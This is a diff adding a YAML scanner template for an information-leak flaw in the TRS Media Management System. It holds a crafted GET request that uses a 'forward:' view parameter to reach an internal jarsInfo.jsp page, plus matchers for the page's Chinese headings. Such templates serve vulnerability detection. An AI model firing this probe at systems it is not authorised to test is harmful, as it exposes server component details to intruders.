@@ -1,0 +1,26 @@
+id: poc-yaml-trs-jarsInfo-leak
+info:
+  name: TRS Media Management System jarsInfo.jsp Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-leak
+http:
+  - method: GET
+    path:
+      - /mas/front/vod/main.do?method=newList&view=forward:/sysinfo/jarsInfo.jsp
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Jar文件信息"
+          - "序号"
+          - "文件"
+          - "大小"
+          - "时间"
+          - "jar中的名称和版本"
+        part: body
